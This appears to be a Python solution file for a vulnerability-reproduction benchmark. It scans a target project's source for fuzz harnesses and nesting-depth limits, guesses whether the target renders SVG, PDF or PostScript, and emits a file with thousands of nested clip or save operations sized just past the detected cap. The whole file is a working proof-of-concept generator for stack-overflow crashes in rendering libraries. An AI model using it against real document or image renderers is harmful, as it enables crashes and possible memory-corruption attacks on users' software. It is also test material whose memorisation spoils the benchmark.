import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


_RE_FUZZ_ENTRY = re.compile(r"\bLLVMFuzzerTestOneInput\b")
_RE_CAP_PATTERNS = [
    re.compile(r"\b(?:kMax|kMaximum|MAX|Max)\w*(?:Nesting|Nest|Depth)\w*\s*=\s*(\d+)\b"),
    re.compile(r"^\s*#\s*define\s+\w*(?:NEST|NESTING|DEPTH)\w*\s+(\d+)\b", re.MULTILINE),
    re.compile(r"\b(?:clip|layer)\w*(?:Stack|stack|Marks|marks|markStack|stackMark)\w*\s*\[\s*(\d+)\s*\]"),
    re.compile(r"\bstd::array\s*<[^,>]+,\s*(\d+)\s*>"),
]

_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".inc", ".ipp", ".m", ".mm",
    ".rs", ".java", ".py", ".go", ".js", ".ts", ".txt", ".md", ".gn", ".gni", ".cmake",
    ".bazel", ".bzl", ".mk",
}


def _looks_text(b: bytes) -> bool:
    if not b:
        return True
    if b.count(b"\x00") > 0:
        return False
    return True


def _decode_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _iter_text_files_from_tar(src_path: str):
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name.lower())
            if ext and ext not in _TEXT_EXTS:
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            if not _looks_text(data):
                continue
            txt = _decode_text(data)
            if txt:
                yield name, txt


def _iter_text_files_from_dir(src_dir: str):
    for root, _, files in os.walk(src_dir):
        for fn in files:
            path = os.path.join(root, fn)
            rel = os.path.relpath(path, src_dir)
            _, ext = os.path.splitext(fn.lower())
            if ext and ext not in _TEXT_EXTS:
                continue
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if not _looks_text(data):
                continue
            txt = _decode_text(data)
            if txt:
                yield rel, txt


def _collect_signals(src_path: str) -> Tuple[List[Tuple[str, str]], List[int], Dict[str, int]]:
    fuzzers: List[Tuple[str, str]] = []
    caps: List[int] = []
    kw_counts: Dict[str, int] = {"svg": 0, "pdf": 0, "ps": 0, "clip": 0, "layer": 0, "canvas": 0, "render": 0}

    if os.path.isdir(src_path):
        iterator = _iter_text_files_from_dir(src_path)
    else:
        iterator = _iter_text_files_from_tar(src_path)

    for name, txt in iterator:
        low = txt.lower()
        if "clip" in low:
            kw_counts["clip"] += low.count("clip")
        if "layer" in low:
            kw_counts["layer"] += low.count("layer")
        if "canvas" in low:
            kw_counts["canvas"] += low.count("canvas")
        if "render" in low:
            kw_counts["render"] += low.count("render")

        if "svg" in low:
            kw_counts["svg"] += low.count("svg")
        if "pdf" in low:
            kw_counts["pdf"] += low.count("pdf")
        if "postscript" in low or re.search(r"\bps\b", low):
            kw_counts["ps"] += low.count("postscript")

        if _RE_FUZZ_ENTRY.search(txt):
            fuzzers.append((name, txt))

        for rx in _RE_CAP_PATTERNS:
            for m in rx.finditer(txt):
                try:
                    n = int(m.group(1))
                except Exception:
                    continue
                if 4 <= n <= 1_000_000:
                    context = txt[max(0, m.start() - 120):min(len(txt), m.end() + 120)].lower()
                    if any(k in context for k in ("clip", "layer", "nest", "depth", "stack", "mark")):
                        caps.append(n)

    return fuzzers, caps, kw_counts


def _score_fuzzer(name: str, txt: str) -> int:
    low = (name + "\n" + txt).lower()
    score = 0
    if "clip" in low:
        score += 40 + 2 * low.count("clip")
    if "layer" in low:
        score += 20 + low.count("layer")
    if "stack" in low:
        score += 10 + low.count("stack")
    if "svg" in low:
        score += 25 + low.count("svg")
    if "pdf" in low:
        score += 25 + low.count("pdf")
    if "postscript" in low or "ghostscript" in low:
        score += 20
    if "canvas" in low:
        score += 10
    if "render" in low:
        score += 10
    if "skia" in low:
        score += 5
    if "librsvg" in low or "resvg" in low or "usvg" in low:
        score += 30
    return score


def _infer_format(fuzzers: List[Tuple[str, str]], kw_counts: Dict[str, int]) -> str:
    chosen_name = ""
    chosen_txt = ""
    best = -1
    for name, txt in fuzzers:
        s = _score_fuzzer(name, txt)
        if s > best:
            best = s
            chosen_name, chosen_txt = name, txt

    low = (chosen_name + "\n" + chosen_txt).lower()

    svg_markers = (
        "sksvg", "svgdom", "librsvg", "rsvg", "resvg", "usvg", "svg",
        "xmlreadmemory", "tinyxml", "libxml",
    )
    pdf_markers = (
        "pdfium", "mupdf", "poppler", "fpdf_", "pdfdocument", "pdf",
        "qpdf", "pdf_load", "loadmemdocument",
    )
    ps_markers = ("ghostscript", "postscript", "ps_interpret", "psapi", "pcl")

    def has_any(markers):
        return any(m in low for m in markers)

    if has_any(svg_markers) and (("svg" in low) or ("rsvg" in low) or ("resvg" in low) or ("usvg" in low)):
        return "svg"
    if has_any(pdf_markers) and "pdf" in low:
        return "pdf"
    if has_any(ps_markers):
        return "ps"

    # fallback by global keyword counts
    if kw_counts["svg"] >= max(kw_counts["pdf"], kw_counts["ps"]) and kw_counts["svg"] > 0:
        return "svg"
    if kw_counts["pdf"] >= max(kw_counts["svg"], kw_counts["ps"]) and kw_counts["pdf"] > 0:
        return "pdf"
    if kw_counts["ps"] > 0:
        return "ps"
    return "svg"


def _choose_depth(caps: List[int]) -> int:
    cap = None
    if caps:
        cands = [n for n in caps if 8 <= n <= 16384]
        if not cands:
            cands = [n for n in caps if 8 <= n <= 65536]
        if cands:
            cap = max(cands)
    if cap is None:
        depth = 8192
    else:
        depth = max(4096, cap + 64)
    if depth > 20000:
        depth = 20000
    return depth


def _gen_svg(depth: int) -> bytes:
    head = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
        b'<defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>'
    )
    open_g = b'<g clip-path="url(#c)">'
    close_g = b'</g>'
    body = b'<rect x="0" y="0" width="1" height="1" fill="black"/>'
    tail = b'</svg>\n'

    out = bytearray()
    out += head
    out += open_g * depth
    out += body
    out += close_g * depth
    out += tail
    return bytes(out)


def _gen_ps(depth: int) -> bytes:
    # Many nested gsave/clip operations, then unwind.
    head = (
        b"%!PS-Adobe-3.0\n"
        b"/rc { newpath 0 0 moveto 1 0 lineto 1 1 lineto 0 1 lineto closepath clip newpath } bind def\n"
    )
    step = b"gsave rc\n"
    unwind = b"grestore\n"
    tail = b"showpage\n"
    out = bytearray()
    out += head
    out += step * depth
    out += b"0 0 moveto (x) show\n"
    out += unwind * depth
    out += tail
    return bytes(out)


def _gen_pdf(depth: int) -> bytes:
    # Minimal PDF with one page and a content stream with deeply nested q + clip operations.
    # Uses 'q'/'Q' (save/restore) plus 're W n' to force a clip mark.
    stream_parts = []
    for _ in range(depth):
        stream_parts.append(b"q 0 0 1 1 re W n\n")
    stream_parts.append(b"0 0 1 1 re f\n")
    for _ in range(depth):
        stream_parts.append(b"Q\n")
    stream = b"".join(stream_parts)
    obj4 = b"<< /Length %d >>\nstream\n%s\nendstream\n" % (len(stream), stream)

    obj1 = b"<< /Type /Catalog /Pages 2 0 R >>\n"
    obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
    obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\n"

    chunks = []
    chunks.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
    offsets = [0]

    def add_obj(n: int, body: bytes):
        offsets.append(sum(len(c) for c in chunks))
        chunks.append(b"%d 0 obj\n" % n)
        chunks.append(body)
        chunks.append(b"endobj\n")

    add_obj(1, obj1)
    add_obj(2, obj2)
    add_obj(3, obj3)
    add_obj(4, obj4)

    xref_pos = sum(len(c) for c in chunks)
    chunks.append(b"xref\n0 5\n")
    chunks.append(b"0000000000 65535 f \n")
    for i in range(1, 5):
        chunks.append(("%010d 00000 n \n" % offsets[i]).encode("ascii"))
    chunks.append(b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n")
    chunks.append(str(xref_pos).encode("ascii") + b"\n%%EOF\n")
    return b"".join(chunks)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fuzzers, caps, kw_counts = _collect_signals(src_path)
        fmt = _infer_format(fuzzers, kw_counts)
        depth = _choose_depth(caps)

        if fmt == "pdf":
            return _gen_pdf(depth)
        if fmt == "ps":
            return _gen_ps(depth)
        return _gen_svg(depth)